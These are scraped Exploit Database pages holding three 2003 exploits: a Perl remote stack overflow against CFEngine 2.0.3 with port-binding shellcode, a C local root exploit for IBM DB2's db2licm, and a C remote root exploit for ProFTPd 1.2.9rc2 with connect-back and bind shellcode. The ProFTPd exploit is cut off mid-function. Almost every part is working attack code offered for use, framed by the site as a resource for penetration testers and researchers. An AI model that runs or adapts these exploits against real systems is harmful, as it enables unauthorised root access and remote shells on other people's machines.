{background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDGNU CFEngine 2.-2.0.3 - Remote Stack OverflowEDB-ID:105CVE:2003-0849EDB Verified:Author:kokaninType:remoteExploit:/Platform:BSDDate:2003-09-27Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl -s# kokaninATdtors.net / cfengine2-2.0.3 from freebsd ports 26/sep/2003.# forking portbind shellcode port=0xb0ef(45295) by eSDee# bug discovered by nick cleaton, tested on FreeBSD 4.8-RELEASEuse IO::Socket;if(!$ARGV[1]){ print "usage: ./DSR-cfengine.pl <host> <port> (default cfengine is 5308)\n"; exit(-1); }$host = $ARGV[0];$port = $ARGV[1];$nop = "\x90";$ret = pack("l",0xbfafe3dc);$shellcode ="\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0"."\x61\xcd\x80\x89\xc7\x31\xc0\x50\x50\x50\x66\x68\xb0\xef\xb7\x02"."\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x57\x50\xb0\x68\xcd\x80"."\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x50\x57"."\x50\xb0\x6a\xcd\x80\x31\xc0\x31\xdb\x50\x89\xe1\xb3\x01\x53\x89"."\xe2\x50\x51\x52\xb3\x14\x53\x50\xb0\x2e\xcd\x80\x31\xc0\x50\x50"."\x57\x50\xb0\x1e\xcd\x80\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80"."\x39\xc3\x75\x44\x31\xc0\x57\x50\xb0\x06\xcd\x80\x31\xc0\x50\x56"."\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x56\x50\xb0\x5a\xcd"."\x80\x31\xc0\x43\x53\x56\x50\xb0\x5a\xcd\x80\x31\xc0\x50\x68\x2f"."\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b"."\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x56\x50\xb0\x06\xcd\x80"."\xeb\x9a";$buf = $nop x 2222 . $shellcode . $ret x 500;$socket = new IO::Socket::INET (Proto  => "tcp",PeerAddr => $host,PeerPort => $port,);die "unable to connect to $host:$port ($!)\n" unless $socket;sleep(1); #you might have to adjust this on slow connectionsprint $socket $buf;close($socket);# milw0rm.com [2003-09-27]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 106
IBM DB2 - Universal Database 7.2 'db2licm' Local Overflow - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDIBM DB2 - Universal Database 7.2 'db2licm' Local OverflowEDB-ID:106CVE:2003-0759EDB Verified:Author:Juan EscribaType:localExploit:/Platform:LinuxDate:2003-09-27Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Local Exploit for db2licmIBM db2 v 7.1 Linux/x86vulnerability researched byJuan Manuel Pascual Escribapask at uninet.edu*/char sc[]="\x31\xc0"      /* begin setuid (0) */"\x31\xdb""\xb0\x17""\xcd\x80""\xeb\x1f""\x5e""\x89\x76\x08""\x31\xc0""\x88\x46\x07""\x89\x46\x0c""\xb0\x0b""\x89\xf3""\x8d\x4e\x08""\x8d\x56\x0c""\xcd\x80""\x31\xdb""\x89\xd8""\x40""\xcd\x80""\xe8\xdc\xff\xff\xff""/bin/sh";#define STACK_TOP_X86 0xC0000000#define ALG_MASK 0xfffffff4#define ADDR 1000#define DB2LICM "/home/db2inst1/sqllib/adm/db2licm"#define DFL_ALG 4int main(int arc, char **arv){char *argv[3];char *envp[2];unsigned long sc_address, ba=0;unsigned char alg = DFL_ALG;unsigned long *p;unsigned char *q;unsigned int i;sc_address = STACK_TOP_X86 - 4 - strlen(DB2LICM) - sizeof(sc) - 1;printf("shellcode address = 0x%X\n",sc_address);if( (sc_address & ALG_MASK) != sc_address ) {ba = sc_address - (sc_address & ALG_MASK);printf("adding %d trailing bytes to backward align Shellcode to 0x%X\n", ba,sc_address & ALG_MASK);sc_address = STACK_TOP_X86 - 4 - strlen(DB2LICM) - sizeof(sc) - ba - 1;printf("new shellcode address = 0x%X\n",sc_address);}envp[0] = (char*)malloc(sizeof(sc)+strlen("pete=")+1+ba);q = envp[0];strcpy(q,"pete=");q += strlen("pete=");memcpy(q,sc,sizeof(sc));q += sizeof(sc)-1;memset(q,'A',ba);q += ba;*q = 0;envp[1] = 0;/* build overflowing arvg[2] */printf("using alignment = %d in overflow buffer\n",alg);argv[0] = DB2LICM;argv[1] = "-a";argv[2] = (char*)malloc(ADDR*sizeof(unsigned long)+alg+1);memset(argv[2],'A',alg);p=(unsigned long*)(argv[2]+alg);for(i=0;i<ADDR;i++) {*p = sc_address;p++;};*p = 0;argv[3] = 0;printf("executing %s ...\n\n",argv[0]);execve(argv[0],argv,envp);}// milw0rm.com [2003-09-27]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 107
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (1) - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (1)EDB-ID:107CVE:2003-0831EDB Verified:Author:bkbllType:remoteExploit:/Platform:LinuxDate:2003-10-04Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* proftpd 1.2.7/1.2.9rc2 remote root exploit by bkbll (bkbll#cnhonker.net, 2003/10/1)* for FTP_ProFTPD_Translate_Overflow  found by X-force* happy birthday, China.* this code is dirty, there are more beautiful exploits of proftpd for this vuln in the world.* this code want to provied u a method, not finally exploit.* using overflow _xlate_ascii_write function return address.* because the overflow is before it connecting to our port,so I have no method for using current socket.* and I have provied two method:bind port and connect back.*/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <errno.h>#include <netdb.h>#include <string.h>#include <signal.h>#include <sys/socket.h>#include <sys/types.h>#include <sys/time.h>#include <sys/select.h>#include <netinet/in.h>#include <arpa/inet.h>#define PORT 21#define SIZE 1024#define BIGSIZE 1024*42#define OFFSET 39         //cbshellcode ip & port offset,0 is the first#define OFF2   70         //bindshellcode port offset,0 is the first#define VER "1.20"char cbshellcode[]= //from www.netric.org,and modified some code by myself"\x31\xc0\x31\xdb\x31\xc9\xb0\x17""\xcd\x80\x31\xc0\x51\xb1\x06\x51""\xb1\x01\x51\xb1\x02\x51\x89\xe1""\xb3\x01\xb0\x66\xcd\x80\x89\xc2""\x31\xc0\x31\xc9\x51\x51\x68\x41""\x42\x43\x44\x66\x68\xb0\xef\xb1""\x02\x66\x51\x90\x89\xe7\xb3\x10""\x53\x57\x52\x89\xe1\xb3\x03\xb0""\x66\xcd\x80\x31\xc9\x39\xc1\x74""\x06\x31\xc0\xb0\x01\xcd\x80\x31""\xc0\xb0\x3f\x89\xd3\xcd\x80\x31""\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd""\x80\x31\xc0\xb0\x3f\x89\xd3\xb1""\x02\xcd\x80\x31\xc9\x51\x68\x6e""\x2f\x73\x68\x68\x2f\x2f\x62\x69""\x89\xe3\x51\x68\x2d\x69\x69\x70""\x89\xe2\x51\x52\x53\x89\xe1\x31""\xd2\x31\xc0\xb0\x0b\xcd\x80\x31""\xc0\xb0\x01\xcd\x80";char bindshellcode[]= //from www.netric.org,and modified some code by myself"\x90\x90\x90\x31\xc0\x31\xdb\x31""\xc9\xb0\x17\xcd\x80\x31\xc0\xb0""\x02\xcd\x80\x39\xc3\x7c\x0c\x31""\xc0\xb0\x02\xcd\x80\x39\xc3\x7c""\x02\xeb\x06\x31\xc0\xb0\x01\xcd""\x80\x51\x31\xc0\x51\xb1\x01\x51""\xb1\x02\x51\x89\xe1\xb3\x01\xb0""\x66\xcd\x80\x89\xc1\x31\xc0\x31""\xdb\x50\x50\x50\x66\x68\xb0\xef""\xb3\x02\x66\x53\x89\xe2\xb3\x10""\x53\xb3\x02\x52\x51\x89\xca\x89""\xe1\xb0\x66\xcd\x80\x31\xdb\x39""\xc3\x74\x05\x31\xc0\x40\xcd\x80""\x31\xc0\x50\x52\x89\xe1\xb3\x04""\xb0\x66\xcd\x80\x89\xd7\x31\xc0""\x31\xdb\x31\xc9\xb3\x11\xb1\x01""\xb0\x30\xcd\x80\x31\xc0\x31\xdb""\x50\x50\x57\x89\xe1\xb3\x05\xb0""\x66\xcd\x80\x89\xc6\x31\xc0\x31""\xc9\x89\xf3\xb0\x3f\xcd\x80\x31""\xc0\x41\xb0\x3f\xcd\x80\x31\xc0""\x41\xb0\x3f\xcd\x80\x31\xc9\x51""\x68\x6e\x2f\x73\x68\x68\x2f\x2f""\x62\x69\x89\xe3\x51\x68\x2d\x69""\x69\x69\x89\xe2\x51\x52\x53\x89""\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd""\x80";int sockfd,sockfd1,sockfd2;int show=0;int mustread=0;int getshell=0;int pt=6000;unsigned int type=1;char bindmethod=0;char usrstr[]="USER";char passtr[]="PASS";char ascistr[]="TYPE A";char pasvstr[]="PASV";char portstr[]="PORT";char storstr[]="STOR";char retrstr[]="RETR";char cmdbuf[SIZE];char srvbuf[SIZE];char *cbhost=NULL;char *server=NULL;struct{char *os;unsigned int ret;int backup; //using for next} targets[] ={{ "rh8.0 ProFTPD 1.2.8 (stable) 1", 0xbffff25c,0},{ "rh8.0 ProFTPD 1.2.8 (stable) 2", 0xbffff22c,0},},v;//main() {}int sendbuf(int socket,char *buffer,int len);int readbuf(char *s,int socket,char *buffer,int len);int client_connect(int sockfd,char* server,int port);void checkstatus(char *s);void retrfile(char *s,int len,int port);void storfile(char *s,int len,int port);int dealpasv(char *s);int setpasv();void setport(char *l,int pt1);void quit();void storbuf(char *filename,char *buf,int size,int port);void retrbuf(char *filename,char *buffer,int length,int port1);void setascii();void loginftp(char *user,char *pass);void setfilename(char *s,int len);int createbuffer(char *s,int len,int type,char *h);int create_serv(int sfd,int port);void modify(char *s,char *h,int port3);void usage(char *s);int execsh(int clifd);int checklf(void *s,int len);main(int argc,char **argv){char buffer[BIGSIZE];char cmdbuf[SIZE];char srvbuf[SIZE];char filename[30];int j,a,b,port1;int total;char c;char *user=NULL;char *pass=NULL;char *localip=NULL;if(argc<2) usage(argv[0]);while((c = getopt(argc, argv, "d:t:u:p:l:h:o:"))!= EOF){switch (c){case 'd':server=optarg;break;case 't':type = atoi(optarg);if((type > sizeof(targets)/sizeof(v)) || (type < 1))usage(argv[0]);break;case 'u':user=optarg;break;case 'p':pass=optarg;break;case 'l':localip=optarg;break;case 'h':cbhost=optarg;break;case 'o':pt=atoi(optarg) & 0xffff;break;default:usage(argv[0]);return 1;}}if(server==NULL || user==NULL || pass==NULL || localip==NULL)usage(argv[0]);printf("@---------------------------------------------------------@\n");printf("# proftpd 1.2.7/1.2.9rc2 remote root exploit(01/10)-%s  #\n",VER);printf("@    by bkbll(bkbll_at_cnhonker.net,bkbll_at_tom.com      @\n");printf("-----------------------------------------------------------\n");printf("[+] Ret address:%p\n",targets[type-1].ret);if(cbhost==NULL)bindmethod=1;else{if((int)inet_addr(cbhost)==-1){printf("[-] Invalid connect back host/ip\n");exit(0);}bindmethod=0;}port1=34568;              //PORTÃüÁîµÄÊ±ºòÔÚ±¾µØ²úÉúµÄÒ»¸ö¶Ë¿Ú.sockfd=sockfd1=sockfd2=0;sockfd=socket(2,1,0);if(client_connect(sockfd,server,PORT)<0) quit();loginftp(user,pass);//port1=setpasv(); //get the pasv portsetport(localip,port1);setfilename(filename,30);setascii();total=createbuffer(buffer,BIGSIZE,type,cbhost);//printf("[+] buffer data size:%d\n",total);storbuf(filename,buffer,total,port1);//stor over, then close and reconnectclose(sockfd);close(sockfd1);close(sockfd2);sockfd=socket(2,1,0);if(client_connect(sockfd,server,PORT)<0) quit(); //reconnectloginftp(user,pass);setascii();setport(localip,port1); //get the pasv port,a new onemustread=total;retrbuf(filename,buffer,total,port1);readbuf("The First time read",sockfd,srvbuf,SIZE);port1++;setport(localip,port1);mustread=total;getshell=1;retrbuf(filename,buffer,total,port1);quit();}void setfilename(char *s,int len){int a;memset(s,0,len);a=getpid();sprintf(s,"%d%d%d.txt",a,a,a);}void retrfile(char *s,int len,int port){int i,pid;char data1;struct sockaddr_in client;memset(&client,0,sizeof(client));sockfd1=socket(2,1,0);if(create_serv(sockfd1,port)<0) quit();i=sizeof(client);sockfd2=accept(sockfd1,(struct sockaddr *)&client,&i);printf("[+] Accepted a client from %s\n",inet_ntoa(client.sin_addr));memset(s,0,len);if(getshell==1){if(bindmethod==0){printf("[+] Is it a shell on %s:%d?\n",cbhost,pt);quit();}else{printf("[+] Waiting for a shell.....\n");sockfd2=socket(AF_INET,SOCK_STREAM,0);sleep(2);client_connect(sockfd2,server,pt);execsh(sockfd2);quit();}}readbuf(NULL,sockfd2,s,len);close(sockfd2);close(sockfd1);}void storfile(char *s,int len,int port){int i;struct sockaddr_in client;memset(&client,0,sizeof(client));sockfd1=socket(2,1,0);if(create_serv(sockfd1,port)<0) 